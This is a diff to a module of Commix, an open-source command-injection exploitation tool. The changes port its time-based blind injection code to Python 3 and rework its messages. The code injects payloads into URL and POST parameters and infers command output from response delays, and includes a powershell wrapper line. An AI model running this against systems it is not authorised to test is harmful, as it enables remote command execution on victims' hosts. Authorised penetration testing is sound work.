@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2019 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -20,19 +20,15 @@ import json
 import string
 import random
 import base64
-import urllib
-import urllib2
-
+from src.thirdparty.six.moves import urllib as _urllib
 from src.utils import menu
 from src.utils import settings
 from src.thirdparty.colorama import Fore, Back, Style, init
-
 from src.core.requests import tor
 from src.core.requests import proxy
 from src.core.requests import headers
 from src.core.requests import requests
 from src.core.requests import parameters
-
 from src.core.injections.controller import checks
 from src.core.injections.blind.techniques.time_based import tb_payloads
 
@@ -50,32 +46,32 @@ def examine_requests(payload, vuln_parameter, http_request_method, url, timesec,
   start = time.time()
 
   # Check if defined method is GET (Default).
-  if http_request_method == "GET":
+  if not menu.options.data:
     # Encoding non-ASCII characters payload.
-    # payload = urllib.quote(payload)   
+    # payload = _urllib.parse.quote(payload)   
     target = url.replace(settings.INJECT_TAG, payload)
     vuln_parameter = ''.join(vuln_parameter)
-    request = urllib2.Request(target)
+    request = _urllib.request.Request(target)
 
   # Check if defined method is POST.
   else :
     parameter = menu.options.data
-    parameter = urllib2.unquote(parameter)
+    parameter = _urllib.parse.unquote(parameter)
     # Check if its not specified the 'INJECT_HERE' tag
-    parameter = parameters.do_POST_check(parameter)
-    parameter = parameter.replace("+","%2B")
+    parameter = parameters.do_POST_check(parameter, http_request_method)
+    parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
     # Define the POST data  
     if settings.IS_JSON:
-      data = parameter.replace(settings.INJECT_TAG, urllib.unquote(payload.replace("\"", "\\\"")))
+      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
       try:
         data = checks.json_data(data)
       except ValueError:
         pass
     elif settings.IS_XML:
-      data = parameter.replace(settings.INJECT_TAG, urllib.unquote(payload)) 
+      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
     else:
       data = parameter.replace(settings.INJECT_TAG, payload)
-    request = urllib2.Request(url, data)
+    request = _urllib.request.Request(url, data.encode(settings.UNICODE_ENCODING))
 
   # Check if defined extra headers.
   headers.do_check(request)
@@ -97,36 +93,36 @@ def injection_test(payload, http_request_method, url):
   start = time.time()
 
   # Check if defined method is GET (Default).
-  if http_request_method == "GET":
+  if not menu.options.data:
     # Encoding non-ASCII characters payload.
-    # payload = urllib.quote(payload)
+    # payload = _urllib.parse.quote(payload)
 
     # Define the vulnerable parameter
     vuln_parameter = parameters.vuln_GET_param(url)
     target = url.replace(settings.INJECT_TAG, payload)
-    request = urllib2.Request(target)
+    request = _urllib.request.Request(target)
               
   # Check if defined method is POST.
   else:
     parameter = menu.options.data
-    parameter = urllib2.unquote(parameter)
+    parameter = _urllib.parse.unquote(parameter)
     # Check if its not specified the 'INJECT_HERE' tag
-    parameter = parameters.do_POST_check(parameter)
-    parameter = parameter.replace("+","%2B")
+    parameter = parameters.do_POST_check(parameter, http_request_method)
+    parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
     # Define the vulnerable parameter
     vuln_parameter = parameters.vuln_POST_param(parameter, url)
     # Define the POST data     
     if settings.IS_JSON:
-      data = parameter.replace(settings.INJECT_TAG, urllib.unquote(payload.replace("\"", "\\\"")))
+      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
       try:
         data = checks.json_data(data)
       except ValueError:
         pass
     elif settings.IS_XML:
-      data = parameter.replace(settings.INJECT_TAG, urllib.unquote(payload)) 
+      data = parameter.replace(settings.INJECT_TAG, _urllib.parse.unquote(payload)) 
     else:
       data = parameter.replace(settings.INJECT_TAG, payload)
-    request = urllib2.Request(url, data)
+    request = _urllib.request.Request(url, data.encode(settings.UNICODE_ENCODING))
     
   # Check if defined extra headers.
   headers.do_check(request)
@@ -185,11 +181,11 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
     minlen = 1
 
   found_chars = False
-  info_msg = "Retrieving the length of execution output... "
+  info_msg = "Retrieving the length of execution output. "
   sys.stdout.write(settings.print_info_msg(info_msg))
   sys.stdout.flush()  
-  if settings.VERBOSITY_LEVEL > 1:
-    print ""
+  if settings.VERBOSITY_LEVEL >= 2:
+    print(settings.SINGLE_WHITESPACE)
   for output_length in range(int(minlen), int(maxlen)):
     if alter_shell:
       # Execute shell commands on vulnerable host.
@@ -202,7 +198,7 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
     payload = parameters.suffixes(payload, suffix)
 
     # Whitespace fixation
-    payload = payload.replace(" ", whitespace)
+    payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
 
     # Perform payload modification
     payload = checks.perform_payload_modification(payload)
@@ -212,9 +208,9 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
       payload_msg = payload.replace("\n", "\\n") 
       sys.stdout.write("\n" + settings.print_payload(payload_msg))
     # Check if defined "--verbose" option.
-    elif settings.VERBOSITY_LEVEL > 1:
-      info_msg = "Generating a payload for injection..."
-      print settings.print_info_msg(info_msg)
+    elif settings.VERBOSITY_LEVEL >= 2:
+      debug_msg = "Generating payload for the injection."
+      print(settings.print_debug_msg(debug_msg))
       payload_msg = payload.replace("\n", "\\n") 
       sys.stdout.write(settings.print_payload(payload_msg) + "\n")
 
@@ -248,15 +244,19 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
 
     if injection_check == True:        
       if output_length > 1:
-        if settings.VERBOSITY_LEVEL >= 1:
+        if settings.VERBOSITY_LEVEL != 0:
           pass
         else:
-          sys.stdout.write("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL+ "]\n")
+          sys.stdout.write(settings.SUCCESS_STATUS + "\n")
           sys.stdout.flush()
         if settings.VERBOSITY_LEVEL == 1:
-          print ""
-        info_msg = "Retrieved: " + str(output_length)
-        print settings.print_info_msg(info_msg)
+          print(settings.SINGLE_WHITESPACE)
+        if settings.VERBOSITY_LEVEL != 0:
+          debug_msg = "Retrieved the length of execution output: " + str(output_length)
+          print(settings.print_bold_debug_msg(debug_msg))
+        else:
+          sub_content = "Retrieved: " + str(output_length)
+          print(settings.print_sub_content(sub_content))
       found_chars = True
       injection_check = False
       break
@@ -270,11 +270,11 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
     check_end = 0
     check_start = time.time()
     output = []
-    percent = "0.0"
-    info_msg = "Presuming the execution output, please wait... " 
-    if menu.options.verbose < 1 :
-      info_msg +=  "[ " +str(percent)+ "% ]"
-    elif menu.options.verbose == 1 :
+    percent = "0.0%"
+    info_msg = "Presuming the execution output." 
+    if settings.VERBOSITY_LEVEL == 0 :
+      info_msg += ".. (" + str(percent) + ")"
+    elif settings.VERBOSITY_LEVEL == 1 :
       info_msg +=  ""
     else:
       info_msg +=  "\n"  
@@ -294,7 +294,7 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
         payload = parameters.suffixes(payload, suffix)
 
         # Whitespace fixation
-        payload = payload.replace(" ", whitespace)
+        payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
         
         # Perform payload modification
         payload = checks.perform_payload_modification(payload)
@@ -304,9 +304,9 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
           payload_msg = payload.replace("\n", "\\n") 
           sys.stdout.write("\n" + settings.print_payload(payload_msg))
         # Check if defined "--verbose" option.
-        elif settings.VERBOSITY_LEVEL > 1:
-          info_msg = "Generating a payload for injection..."
-          print settings.print_info_msg(info_msg)
+        elif settings.VERBOSITY_LEVEL >= 2:
+          debug_msg = "Generating payload for the injection."
+          print(settings.print_debug_msg(debug_msg))
           payload_msg = payload.replace("\n", "\\n") 
           sys.stdout.write(settings.print_payload(payload_msg) + "\n")
 
@@ -339,14 +339,16 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
           injection_check = True
           
         if injection_check == True:
-          if not settings.VERBOSITY_LEVEL >= 1:
+          if settings.VERBOSITY_LEVEL == 0:
             output.append(chr(ascii_char))
             percent = ((num_of_chars*100)/output_length)
             float_percent = str("{0:.1f}".format(round(((num_of_chars * 100)/(output_length * 1.0)),2))) + "%"
             if percent == 100:
-              float_percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
-            info_msg = "Presuming the execution output, "
-            info_msg += "please wait... [ " + float_percent + " ]"
+              float_percent = settings.info_msg
+            else:
+              float_percent = ".. (" + str(float_percent) + ")"
+            info_msg = "Presuming the execution output."
+            info_msg += float_percent
             sys.stdout.write("\r" + settings.print_info_msg(info_msg))
             sys.stdout.flush()
           else:
@@ -364,16 +366,17 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
 
   else:
     check_start = 0
-    if not settings.VERBOSITY_LEVEL >= 1:
-      sys.stdout.write("[" +Fore.RED+ " FAILED " + Style.RESET_ALL+ "]")
+    if settings.VERBOSITY_LEVEL == 0:
+      sys.stdout.write(settings.FAIL_STATUS)
       sys.stdout.flush()
     else:
-      print ""
+      pass
+
     check_how_long = 0
     output = False
 
-  if settings.VERBOSITY_LEVEL >= 1 and menu.options.ignore_session:
-    print ""
+  if settings.VERBOSITY_LEVEL != 0 and menu.options.ignore_session:
+    print(settings.SINGLE_WHITESPACE)
   return  check_how_long, output
 
 """
@@ -389,14 +392,11 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
       cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
 
   found_chars = False
-  info_msg = "Checking the reliability of the used payload "
-  info_msg += "in case of a false positive result... "
-  if settings.VERBOSITY_LEVEL == 1: 
-    sys.stdout.write(settings.print_info_msg(info_msg))
+  debug_msg = "Checking the reliability of the used payload "
+  debug_msg += "in case of a false positive result. "
+  if settings.VERBOSITY_LEVEL != 0: 
+    sys.stdout.write(settings.print_debug_msg(debug_msg))
     sys.stdout.flush()
-  # Check if defined "--verbose" option.
-  elif settings.VERBOSITY_LEVEL > 1:
-    print settings.print_info_msg(info_msg)
 
   # Varying the sleep time.
   timesec = timesec + random.randint(1, 5)
@@ -414,7 +414,7 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
     payload = parameters.suffixes(payload, suffix)
 
     # Whitespace fixation
-    payload = payload.replace(" ", whitespace)
+    payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
 
     # Perform payload modification
     payload = checks.perform_payload_modification(payload)
@@ -424,9 +424,9 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
       payload_msg = payload.replace("\n", "\\n") 
       sys.stdout.write("\n" + settings.print_payload(payload_msg))
     # Check if defined "--verbose" option.
-    elif settings.VERBOSITY_LEVEL > 1:
-      info_msg = "Generating a payload for testing the reliability of used payload..."
-      print settings.print_info_msg(info_msg)
+    elif settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "Generating payload for testing the reliability of used payload."
+      print("\n" + settings.print_debug_msg(debug_msg))
       payload_msg = payload.replace("\n", "\\n") 
       sys.stdout.write(settings.print_payload(payload_msg) + "\n")
 
@@ -485,7 +485,7 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
         payload = parameters.suffixes(payload, suffix)
 
         # Whitespace fixation
-        payload = payload.replace(" ", whitespace)
+        payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
 
         # Perform payload modification
         payload = checks.perform_payload_modification(payload)
@@ -495,9 +495,9 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
           payload_msg = payload.replace("\n", "\\n") 
           sys.stdout.write("\n" + settings.print_payload(payload_msg))
         # Check if defined "--verbose" option.
-        elif settings.VERBOSITY_LEVEL > 1:
-          info_msg = "Generating a payload for testing the reliability of used payload..."
-          print settings.print_info_msg(info_msg)
+        elif settings.VERBOSITY_LEVEL >= 2:
+          debug_msg = "Generating payload for testing the reliability of used payload."
+          print(settings.print_debug_msg(debug_msg))
           payload_msg = payload.replace("\n", "\\n") 
           sys.stdout.write(settings.print_payload(payload_msg) + "\n")
 
@@ -538,8 +538,14 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
 
     if str(output) == str(randvcalc):
       if settings.VERBOSITY_LEVEL == 1:
-        print ""
+        print(settings.SINGLE_WHITESPACE)
       return how_long, output
+  else:
+    if settings.VERBOSITY_LEVEL < 2:
+      print(settings.SINGLE_WHITESPACE)
+    warn_msg = "False positive or unexploitable injection point detected."
+    print(settings.print_warning_msg(warn_msg))
+        
 
 """
 Export the injection results
@@ -548,10 +554,10 @@ def export_injection_results(cmd, separator, output, check_how_long):
 
   if output != "" and check_how_long != 0 :
     if settings.VERBOSITY_LEVEL == 0:
-      print "\n"
+      print("\n")
     elif settings.VERBOSITY_LEVEL == 1:
-      print ""  
-    print Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL
+      print(settings.SINGLE_WHITESPACE)  
+    print(settings.print_output(output))
     info_msg = "Finished in " + time.strftime('%H:%M:%S', time.gmtime(check_how_long)) + "."
     sys.stdout.write("\n" + settings.print_info_msg(info_msg))
   else:
@@ -561,10 +567,12 @@ def export_injection_results(cmd, separator, output, check_how_long):
       err_msg += "any output due to '" + separator + "' filtration on target host. "
       err_msg += "To bypass that limitation, use the '--alter-shell' option "
       err_msg += "or try another injection technique (i.e. '--technique=\"f\"')"
-      print "\n" + settings.print_critical_msg(err_msg)
+      print("\n" + settings.print_critical_msg(err_msg))
       raise SystemExit()
     # Check for fault command.
     else:
       err_msg = "The '" + cmd + "' command, does not return any output."
-      print settings.print_critical_msg(err_msg)     
+      if settings.VERBOSITY_LEVEL == 0:
+        print(settings.SINGLE_WHITESPACE)
+      sys.stdout.write("\r" + settings.print_critical_msg(err_msg))
 # eof
